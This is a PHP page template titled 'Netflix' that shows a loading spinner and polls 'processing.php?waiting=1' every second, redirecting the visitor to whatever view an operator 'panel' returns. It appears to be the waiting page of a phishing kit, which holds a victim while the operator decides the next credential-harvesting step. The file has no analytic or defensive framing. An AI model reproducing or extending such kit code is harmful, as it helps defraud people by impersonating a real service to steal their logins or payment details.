<?php
require_once 'config/panel.php';
$title = "Netflix";
ob_start();
?>

<div style="min-height:500px;" class="w-100 d-flex flex-column justify-content-start align-items-center bg-black vh-100">


    <p style="font-size: 12px;" class="text-center text-white mt-5"><?= lang("xload1"); ?><br><?= lang("xload2"); ?></p>
   
    <div class="w-100 d-flex justify-content-center">
    <div id="loader" class="bfLoader"></div>
    </div>
</div>

<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script>
    var z = setInterval(function() {
        $.ajax({
            method: "GET",
            url: 'processing.php?waiting=1',
            success: function(data) {
                if (data !== '') {
                    window.location.href = 'index.php?view=' + data + '&id=<?= md5(time()) ?>';
                }
            },
        });

    }, 1000); // 1000 = 1s
</script>
<?php $content = ob_get_clean(); ?>
<?php require_once 'views/layout_dash.php' ?>